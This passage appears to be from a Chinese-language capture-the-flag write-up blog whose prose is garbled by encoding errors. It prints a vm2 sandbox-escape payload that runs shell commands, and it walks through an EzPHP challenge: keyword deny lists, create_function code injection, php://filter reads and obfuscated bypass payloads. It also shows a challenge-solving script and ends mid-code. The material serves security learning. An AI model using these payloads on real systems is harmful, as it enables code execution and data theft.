function">constructor</span><span class="token punctuation">(</span><span class="token string">"return process"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span><span class="token punctuation">&#123;</span>        Object<span class="token punctuation">.</span><span class="token function">preventExtensions</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> e<span class="token punctuation">.</span><span class="token function">get_process</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">+</span><span class="token string">')()'</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">VM</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>untrusted<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯è¿™é¢˜æœ‰å…³é”®å­—è¿‡æ»¤ï¼Œåœ¨è¿™ä½¿ç”¨javascriptçš„æ¨¡ç‰ˆæ–‡å­—ç»•è¿‡ï¼Œå¦‚</p><pre class="line-numbers language-none"><code class="language-none">prototypeå˜æˆ&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æœ€ç»ˆpayload</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    TypeError<span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">prototyp</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">e</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">get_proces</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">s</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token parameter">f</span><span class="token operator">=></span>f<span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">constructo</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">r</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">return this.proces</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">s</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span><span class="token punctuation">&#123;</span>        Object<span class="token punctuation">.</span><span class="token function">preventExtensions</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> e<span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">get_proces</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">s</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>mainModule<span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">requir</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">e</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">child_proces</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">s</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">exe</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">cSync</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">cat /flag</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p>çœ‹æºç ï¼Œbase32è§£ç åè®¿é—®</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1nD3x.php"</span><span class="token punctuation">;</span><span class="token variable">$shana</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shana'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br />&lt;font color=red>&lt;B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B>&lt;br>&lt;/font>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>        <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span>          <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'You seem to want to do something bad?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^aqua_is_cute$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'debu'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'debu'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'aqua_is_cute'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Neeeeee! Good Job!&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fxck you! What do you want to do ?!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>              <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fxck you! I hate English!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'debu_debu_aqua'</span><span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$shana</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$shana</span> <span class="token operator">!=</span> <span class="token variable">$passwd</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Very good! you know my password. But what is flag?&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!Aqua is the cutest five-year-old child in the world! Isn't it ?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å°±æ˜¯ç»•å‘—</p><p><strong>P1</strong></p><p><code>$_SERVER[&quot;QUERY_STRING&quot;] </code>ä¸­æ˜¯?åçš„å†…å®¹ï¼Œåœ¨ç›´æ¥è¯»å–æ—¶å¹¶ä¸ä¼šè¿›è¡Œurlè§£ç ï¼Œä½†æ˜¯åœ¨ä½¿ç”¨$_GETè®¿é—®æŸä¸€å‚æ•°çš„æ—¶å€™ä¼šè¿›è¡ŒURLè§£ç ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬åªéœ€è¦å¯¹å†…å®¹è¿›è¡ŒURLç¼–ç å³å¯</p><p><strong>P2</strong></p><p>æ¢è¡Œç»•è¿‡</p><p><strong>P3</strong></p><p>åœ¨<code>$_REQUEST</code>ä¸­ï¼ŒPOSTçš„ä¼˜å…ˆçº§å¤§äºGETä¼ å…¥çš„å‚é‡ï¼Œæ‰€ä»¥æˆ‘ä»¬å†åœ¨POSTä¸­é‡æ–°ä¼ ä¸€æ¬¡åŒåå‚é‡å°±è¡Œ</p><p><strong>P4</strong></p><p>ä¼ªåè®®ç»•è¿‡ï¼Œè®°å¾—URLç¼–ç </p><p><strong>P5</strong></p><p>SHA1å¼ºæ¯”è¾ƒç»•è¿‡ï¼Œç±»ä¼¼md5ï¼Œç”¨æ•°ç»„å³å¯</p><p><strong>P6</strong></p><p>æ–°çŸ¥è¯†ï¼šcreate_function()</p><blockquote><p>create_function()æ³¨å…¥åŸç†ï¼š</p><p>create_function()å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°<code>$args</code>å’Œ<code>$code</code>ï¼Œç”¨äºåˆ›å»ºä¸€ä¸ªlambdaæ ·å¼çš„å‡½æ•°ï¼Œé¦–å…ˆå¯ä»¥ç”¨create_function()åˆ›å»ºä¸€ä¸ªç®€å•å‡½æ•°</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$afunc</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'$a, $b'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'return ($a+$b);'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$afunc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¾“å‡º3</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>è€Œæœ¬é¢˜çš„$code(â€˜â€™, $arg); //æ­¤å¤„å­˜åœ¨create_function()æ³¨å…¥ä¸­å¯ä»¥é€šè¿‡æ§åˆ¶$argæ¥è¿›è¡Œä»£ç æ³¨å…¥<br>é¦–å…ˆä¿è¯ä¼ å…¥çš„$codeä¸ºcreate_funtionï¼Œ<br>å…¶æ¬¡æ˜¯$argå‚æ•°ï¼Œæœ¬é¢˜ä¸­è¿‡æ»¤äº†catã€flagã€scanç­‰å…³é”®å­—ï¼Œæ— æ³•ç›´æ¥å‘½ä»¤æ‰§è¡Œå¾—åˆ°flagçš„å€¼ï¼Œåœ¨ç½‘ä¸ŠæŸ¥é˜…åæ‰¾åˆ°äº†åˆé€‚çš„å‡½æ•°get_defined_vars()ç›´æ¥è¾“å‡ºæ‰€æœ‰å˜é‡ï¼Œæ„é€ payloadå¦‚ä¸‹</p></blockquote><pre class="line-numbers language-none"><code class="language-none">fl%61g[c%6fde]&#x3D;create_function&amp;fl%61g[%61rg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶é¹…è¿˜æ˜¯æ‹¿ä¸åˆ°flagï¼Œæç¤ºflagåœ¨<code>rea1fl4g.php</code>ä¸­ï¼Œè®¿é—®å‘ç°æ‹¿ä¸åˆ°ï¼Œåº”è¯¥æ˜¯ä»¥å˜é‡å½¢å¼æ”¾è¿›å»äº†ï¼Œé‚£ä¹ˆå°è¯•åŒ…å«è¿™ä¸ªæ–‡ä»¶å¹¶å°†æ‰€æœ‰å˜é‡æ‰“å°å‡ºæ¥åº”è¯¥å°±è¡Œäº†ï¼Œincludeå‡½æ•°è¢«banï¼Œå°è¯•requireåŠ base64ç¼–ç </p><pre class="line-numbers language-none"><code class="language-none">fl%61g[%61rg]&#x3D;&#125;require(base64_dec%6fde(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç»™äº†ä¸ªå‡çš„flagğŸ˜…ï¼Œè¯»æºç </p><pre class="line-numbers language-none"><code class="language-none">require(php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;rea1fl4g.php);æ»¤çš„å¤ªå¤šäº†èµ°å–åç»•è¿‡å§fl%61g[%61rg]&#x3D;&#125;require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">$f4ke_flag &#x3D; &quot;BJD&#123;1am_a_fake_f41111g23333&#125;&quot;;$rea1_f1114g &#x3D; &quot;flag&#123;4821ec92-8b00-4b72-b98c-4a7a296d9073&#125;&quot;;unset($rea1_f1114g);unsetå°±ç¦»è°±ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> timeurl<span class="token operator">=</span><span class="token string">"http://3dd7fedb-f52b-4054-a53e-07ea193a2b99.node4.buuoj.cn:81/index.php"</span>cookie<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span><span class="token string">"f564584a331647033d332274c6bc3eb5"</span><span class="token punctuation">&#125;</span>tes<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookie<span class="token punctuation">)</span><span class="token punctuation">.</span>texti<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r"\d+\s[\/|\+|\*|-]\s\d+"</span><span class="token punctuation">,</span>tes<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>tes<span class="token punctuation">)</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'answer'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">eval</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">&#125;</span>    tes<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookie<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text    i <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r"\d+\s[\/|\+|\*|-]\s\d+"</span><span class="token punctuation">,</span> tes<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"flag&#123;"</span> <span class="token keyword">in</span> tes<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>tes<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'Ã§Â¬Â¬ \d+ Ã¦Â¬'</span><span class="token punctuation">,</span>tes<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ²¡äº†</p><h2 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h2><p><a href="http://www.zipæ‹¿æºç /">www.zipæ‹¿æºç </a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-type:text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$Private_key</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Private_key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token 